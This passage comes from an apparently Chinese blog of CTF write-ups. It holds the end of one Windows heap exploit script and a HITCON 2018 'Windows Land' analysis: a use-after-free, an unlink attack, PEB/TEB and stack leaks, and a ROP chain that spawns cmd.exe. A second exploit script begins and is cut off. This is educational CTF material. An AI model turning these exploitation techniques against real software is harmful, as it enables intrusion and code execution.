class="string">"heaphead"</span>)</span><br><span class="line">heap_head = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x08'</span>)</span><br><span class="line">encoding = heap_head ^ ctor_heap_head(<span class="number">0x70</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak freelist address</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x76</span>, <span class="string">"B"</span> * <span class="number">0x6E</span> + <span class="string">"freelist"</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"freelist"</span>)</span><br><span class="line">freelist = u32(p.recvline()[:<span class="number">-2</span>].rjust(<span class="number">4</span>, <span class="string">"\x00"</span>)) + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fix chunk 2 head</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">"B"</span> * <span class="number">0x68</span> + p64(heap_head))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">'A'</span> * <span class="number">0x68</span> + p64(ctor_heap_head(<span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>) ^ encoding) + p32(chunk_array) + p32(chunk_array + <span class="number">4</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now chunk_array[1] points to itself</span></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">shoot(chunk_status + <span class="number">1</span>)</span><br><span class="line">ucrtbase = leak_info(chunk_array, puts_iat) - <span class="number">0x95A30</span> <span class="comment">#0xb48d0</span></span><br><span class="line">system = ucrtbase + <span class="number">0xB8320</span> <span class="comment">#0xec730</span></span><br><span class="line">kernel32 = leak_info(chunk_array, heapfree_iat) - <span class="number">0x13FC0</span> <span class="comment">#0x1df60</span></span><br><span class="line">kernel32_atol = kernel32 + <span class="number">0x81800</span> <span class="comment">#0x81B70</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ntdll</span></span><br><span class="line">ntdll = leak_info(chunk_array, kernel32_atol) - <span class="number">0x72980</span> <span class="comment">#0x76870</span></span><br><span class="line">ntdll_peb_addr = ntdll + <span class="number">0x10eb84</span> <span class="comment">#0x125d34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak peb and teb</span></span><br><span class="line">PEB = leak_info(chunk_array, ntdll_peb_addr) - <span class="number">0x44</span></span><br><span class="line">TEB = PEB + <span class="number">0x3000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack address</span></span><br><span class="line">stack_end = leak_info(chunk_array, TEB + <span class="number">6</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find where return address is stored</span></span><br><span class="line">ret_addr_pos = stack_end - <span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> leak_info(chunk_array, ret_addr_pos) == ret_from_main:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret_addr_pos -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack ret address</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x14</span>, p32(chunk_array + <span class="number">4</span>) + p32(ret_addr_pos) + p32(<span class="number">0</span>) + <span class="string">"cmd.exe\x00"</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p32(system) + p32(<span class="number">0</span>) + p32(chunk_array + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] PIE base is: "</span> + hex(PIE))</span><br><span class="line">print(<span class="string">"[+] Encoding is: "</span> + hex(encoding))</span><br><span class="line">print(<span class="string">"[+] Freelist address is: "</span> + hex(freelist))</span><br><span class="line">print(<span class="string">"[+] ucrtbase address is: "</span> + hex(ucrtbase))</span><br><span class="line">print(<span class="string">"[+] kernel32 address is: "</span> + hex(kernel32))</span><br><span class="line">print(<span class="string">"[+] ntdll address is: "</span> + hex(ntdll))</span><br><span class="line">print(<span class="string">"[+] PEB address is: "</span> + hex(PEB))</span><br><span class="line">print(<span class="string">"[+] TEB address is: "</span> + hex(TEB))</span><br><span class="line">print(<span class="string">"[+] stack_end address is: "</span> + hex(stack_end))</span><br><span class="line">print(<span class="string">"[+] return address lies on: "</span> + hex(ret_addr_pos))</span><br><span class="line">print(<span class="string">"[+] system address is: "</span> + hex(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="Windows-HITCON-2018-Windows-Land"><a href="#Windows-HITCON-2018-Windows-Land" class="headerlink" title="[Windows][HITCON 2018]Windows Land"></a>[Windows][HITCON 2018]Windows Land</h1><h2 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h2><p>典型的菜单题，但是比较繁杂，总的来说，就是有五种操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create</span><br><span class="line">list</span><br><span class="line">edit</span><br><span class="line">delete</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>以及五个操作对象：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) Teacher</span><br><span class="line">2) Engineer</span><br><span class="line">3) Doctor</span><br><span class="line">4) Athlete</span><br><span class="line">5) Pig</span><br></pre></td></tr></table></figure>
<p>由于是C++程序，仔细分析可以发现，五种对象都是以<code>vector</code>形式存储的，增删通过相应的<code>push_back</code>和<code>erase</code>进行。</p>
<p>而其中比较与众不同的是<code>Engineer</code>，它的成员里包含一个动态分配的指针，也就是<code>language</code>成员变量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What language&gt; "</span>);</span><br><span class="line">v41 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;DstBuf, <span class="number">1u</span>) &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)DstBuf == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)info_buf + v41) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)info_buf + v41++) = DstBuf;</span><br><span class="line">  <span class="keyword">if</span> ( v41 &gt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">v56 = <span class="number">0</span>i64;</span><br><span class="line">v57 = age;</span><br><span class="line">v55 = name_buf[<span class="number">0</span>];</span><br><span class="line">v58 = <span class="number">0</span>i64;</span><br><span class="line">v59 = (&amp;carrier_array)[carrier_idx];</span><br><span class="line">v60 = salary;</span><br><span class="line"><span class="keyword">if</span> ( LOBYTE(info_buf[<span class="number">0</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)random_padding + <span class="number">512</span>);</span><br><span class="line">  v58 = v0;</span><br><span class="line">  *(_OWORD *)v0 = info_buf[<span class="number">0</span>];</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">16</span>) = info_buf[<span class="number">1</span>];</span><br><span class="line">  *(_WORD *)(v0 + <span class="number">20</span>) = WORD2(info_buf[<span class="number">1</span>]);</span><br><span class="line">  v42 = BYTE6(info_buf[<span class="number">1</span>]);</span><br><span class="line">  *(_BYTE *)(v0 + <span class="number">22</span>) = BYTE6(info_buf[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">void</span> *)engineer_array_capacity == *(&amp;engineer_array_start + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_7FF6C3CF3740(v42, *(&amp;engineer_array_start + <span class="number">1</span>), &amp;v55);</span><br><span class="line">  v0 = v58;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_7FF6C3CF1130(*(&amp;engineer_array_start + <span class="number">1</span>), &amp;v55);</span><br><span class="line">  *(&amp;engineer_array_start + <span class="number">1</span>) = (<span class="keyword">char</span> *)*(&amp;engineer_array_start + <span class="number">1</span>) + <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v0 )</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)v0);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>这里先<code>malloc</code>再<code>free</code>的是一个局部变量，在进行<code>push_back</code>中会进行拷贝，也就是会再分配一个同样大小的buffer作为<code>language</code>，并把0x18 bytes的数据复制进去。</p>
<p>而漏洞存在于：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// edit function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">rsi14 = rsi13 - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!rsi14)</span><br><span class="line">&#123;</span><br><span class="line">    rdi50 = <span class="number">0</span>i64;</span><br><span class="line">    r10_50 = ((_BYTE *)*(&amp;engineer_array_start + <span class="number">1</span>) - (_BYTE *)engineer_array_start) / <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> (r10_50)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (r9_51 = <span class="number">0</span>i64;; r9_51 += <span class="number">48</span>i64)</span><br><span class="line">        &#123;</span><br><span class="line">            rax52 = (<span class="keyword">unsigned</span> __int8 *)engineer_array_start + r9_51;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                ecx53 = rax52[(<span class="keyword">char</span> *)info_buf - ((_BYTE *)engineer_array_start + r9_51)];</span><br><span class="line">                edx53 = *rax52 - ecx53;</span><br><span class="line">                <span class="keyword">if</span> (edx53)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                ++rax52;</span><br><span class="line">            &#125; <span class="keyword">while</span> (ecx53);</span><br><span class="line">            <span class="keyword">if</span> (!edx53)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (++rdi50 &gt;= r10_50)</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit failed\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"What language&gt; "</span>);</span><br><span class="line">        <span class="built_in">memset</span>(info_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(info_buf));</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">read</span>(<span class="number">0</span>, DstBuf, <span class="number">1u</span>) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (DstBuf[<span class="number">0</span>] == <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                *((_BYTE *)info_buf + rbx1) = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *((_BYTE *)info_buf + rbx1++) = DstBuf[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (rbx1 &gt;= <span class="number">0x100</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        rcx64 = (_DWORD *)*((_QWORD *)engineer_array_start + <span class="number">6</span> * rdi50 + <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span> (LOBYTE(info_buf[<span class="number">0</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (rcx64) <span class="comment">// uaf here</span></span><br><span class="line">            &#123;</span><br><span class="line">                eax66 = info_buf[<span class="number">1</span>];</span><br><span class="line">                *(_OWORD *)rcx64 = info_buf[<span class="number">0</span>];</span><br><span class="line">                rcx64[<span class="number">4</span>] = eax66;</span><br><span class="line">                *((_WORD *)rcx64 + <span class="number">10</span>) = WORD2(info_buf[<span class="number">1</span>]);</span><br><span class="line">                *((_BYTE *)rcx64 + <span class="number">22</span>) = BYTE6(info_buf[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sub_7FF6C3CF11D0((__int64)engineer_array_start + <span class="number">48</span> * rdi50, (__int64)info_buf);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (rcx64)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(rcx64); <span class="comment">// free but not set zero</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit succeed\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit succeed\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>也就是在<code>edit</code>该<code>Engineer-&gt;language</code>的时候，如果第一个字节为”\x00”，那么就会直接触发<code>free</code>，但是并不会置为0（当然正常地<code>edit</code>也是可以的，但是只能写0x18 bytes到buffer里面）。所以，这里存在UAF可以利用。</p>
<h2 id="利用思路-6"><a href="#利用思路-6" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>由于windows的heap比较复杂，而且经过不断地调试发现，其布局是不可预测的，所以不太可能像linux下一样通过偏移直接定位到目标chunk；再加上程序刚开始读了一个随机数（0x00 ~ 0xF0），每次对<code>Engineer-&gt;language</code>进行<code>malloc</code>的时候，都会在0x200的基础上加上该随机数，使得heap布局更加无法预测。经过长时间地调试发现，可以通过其他类型的操作对象（如<code>teacher</code>等）先对heap上的碎片进行占位，考虑到<code>vector</code>的增长方式是<code>1、2、3、4、6、9、13、19、28、...</code>（capacity），对应的size为<code>0x30、0x60、0x90、0xc0、0x120、0x1B0、0x270、0x390、0x540、...</code>，因此将相应的几个<code>vector</code>占到0x270 bytes大小的chunk，之后对<code>Engineer</code>进行操作的时候，heap布局就会稍微稳定一些： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000021d873d7110 0028 0013  [00]   0000021d873d7120    00270 - (busy) &#x3D;&#x3D;&gt; vector doctor </span><br><span class="line">0000021d873d7390 0028 0028  [00]   0000021d873d73a0    00270 - (busy) &#x3D;&#x3D;&gt; vector athlete</span><br><span class="line">0000021d873d7610 0028 0028  [00]   0000021d873d7620    00270 - (free) &#x3D;&#x3D;&gt; vector engineer (old old)</span><br><span class="line">0000021d873d7890 0028 0028  [00]   0000021d873d78a0    00270 - (busy) &#x3D;&#x3D;&gt; vector teacher</span><br><span class="line">0000021d873d7b10 003a 0028  [00]   0000021d873d7b20    00390 - (free) &#x3D;&#x3D;&gt; vector engineer (old)</span><br><span class="line">0000021d873d7eb0 0055 003a  [00]   0000021d873d7ec0    00540 - (busy) &#x3D;&#x3D;&gt; vector engineer </span><br><span class="line">0000021d873d8400 00bc 0055  [00]   0000021d873d8410    00bb0 - (free)</span><br></pre></td></tr></table></figure>
在<code>0x0000021d873d7ec0</code>这个chunk还没有拿到的时候是一个大的<code>freed</code>状态的块，其<code>Blink</code>指向的是<code>0x0000021d873d7620</code>。</li>
<li>同时发现，<code>Engineer-&gt;name</code>是没有自动在结尾补”\x00”的，再加上其位置为chunk的Flink所在位置，紧挨着Blink，而且进行拷贝构造的时候，Blink也会拷贝到这个<code>vector</code>中，所以可以通过<code>Engineer-&gt;name</code>来对heap进行一个leak，从而找到目标<code>Engineer</code>的<code>vector</code>的准确位置（也就是leak出来的<code>Blink + 0x280 + 0x280 + 0x3a0 = Blink + 0x8a0</code>）。</li>
<li>由于<code>vector Engineer</code>的size达到0x540的时候，其成员个数在<code>20 ~ 28</code>变化不会改变<code>vector</code>的大小，所以可以利用这几个成员对<code>Engineer-&gt;language</code>进行操作，比如这里我们申请出7个<code>language</code>的buffer进行后续利用（实际上用不上这么多）： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">000001fbc7797fa0 0028 0028  [00]   000001fbc7797fb0    00270 - (free)</span><br><span class="line">000001fbc7798220 0028 0028  [00]   000001fbc7798230    00270 - (busy)</span><br><span class="line">000001fbc77984a0 003a 0028  [00]   000001fbc77984b0    00390 - (free) </span><br><span class="line">000001fbc7798840 0055 003a  [00]   000001fbc7798850    00540 - (busy) &#x3D;&#x3D;&gt; vector engineer</span><br><span class="line">000001fbc7798d90 002c 0055  [00]   000001fbc7798da0    002b0 - (busy) &#x3D;&#x3D;&gt; language[20]</span><br><span class="line">000001fbc7799050 002c 002c  [00]   000001fbc7799060    002b0 - (busy) &#x3D;&#x3D;&gt; language[21]</span><br><span class="line">000001fbc7799310 002c 002c  [00]   000001fbc7799320    002b0 - (free) &#x3D;&#x3D;&gt; language[22] </span><br><span class="line">000001fbc77995d0 002c 002c  [00]   000001fbc77995e0    002b0 - (busy) &#x3D;&#x3D;&gt; language[23]</span><br><span class="line">000001fbc7799890 002c 002c  [00]   000001fbc77998a0    002b0 - (free) &#x3D;&#x3D;&gt; language[24]</span><br><span class="line">000001fbc7799b50 002c 002c  [00]   000001fbc7799b60    002b0 - (busy) &#x3D;&#x3D;&gt; language[25]</span><br><span class="line">000001fbc7799e10 002c 002c  [00]   000001fbc7799e20    002b0 - (busy) &#x3D;&#x3D;&gt; language[26]</span><br><span class="line">000001fbc779a0d0 00ef 002c  [00]   000001fbc779a0e0    00ee0 - (free) </span><br><span class="line">000001fbc779afc0 0004 00ef  [00]   000001fbc779afd0    00030 - (busy)</span><br></pre></td></tr></table></figure>
 这里显示的是依次<code>free(language[22]); free(language[24]);</code>的状态，然后利用UAF改掉<code>language[22]</code>的<code>Flink</code>和<code>Blink</code>，进行unlink attack。<br> 这样，<code>vector engineer</code>相应成员的<code>language</code>（记为<code>victim_1</code>）就指向了自己，从而可以借此进行任意地址读写。</li>
<li>这里采用先让该<code>victim</code>指向另一个未被删除的<code>language</code>（记为<code>victim_2</code>）的位置，从而避免了如果直接修改<code>victim_1</code>本身，那么完成了一次任意地址写之后，就控不回<code>victim_1</code>的情况了；另外，由于<code>language</code>是不会被打印出来的，这里要通过修改<code>engineer</code>的另一个类成员的<code>title</code>指针，使其指向另一个未被修改的<code>title</code>指针，从而在<code>list</code>的时候将<code>text</code>的地址打印出来。同样的方法，可以leak任意可读地址的数据。</li>
<li>需要注意的是，由于我们后续的目标是执行<code>system(&quot;cmd.exe&quot;)</code>，并且该调用会触发内存分配的操作，所以要求heap结构处于合法的状态，否则会被检测从而报错退出。因此，只要将<code>victim_1</code>的原<code>Flink</code>和<code>Blink</code>的双向链表进行修复即可。</li>
<li>之后就是一个标准操作，通过binary的IAT表，leak出<code>ntdll</code>和<code>ucrtbase</code>的基址，并通过<code>ntdll!PebLdr</code>上方存在的<code>PEB</code>相关地址leak出<code>PEB</code>并且计算出<code>TEB</code>的位置（两者偏移固定），然后将<code>TEB-&gt;StackLimit</code>给leak出来得到该进程的栈地址，最后通过暴力搜索找到<code>main</code>函数的返回地址。</li>
<li>最后通过任意地址写在<code>main</code>函数返回地址处写入ROP，从而在返回时触发调用<code>system(&quot;cmd.exe&quot;)</code>。</li>
</ol>
<blockquote>
<p>虽然windows的heap还是具有一定的不确定性，成功率不是100%，主要在于最开始以0x8a0作为偏移这里可能会有不确定性，但是本地的交互速度以及准确率还是很可观的，马上就能有结果。<br>比较恶心的，本地尚且无法100%，加上远程环境毕竟和我本地的win10不同，所以实际在打远程的时候一度让我怀疑人生，一直都是失败，最后终于是成功了一次。<br>虽然我曾花了很大的功夫，企图提高成功率，但终究无果，不知道有没有更好的方法。</p>
</blockquote>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span 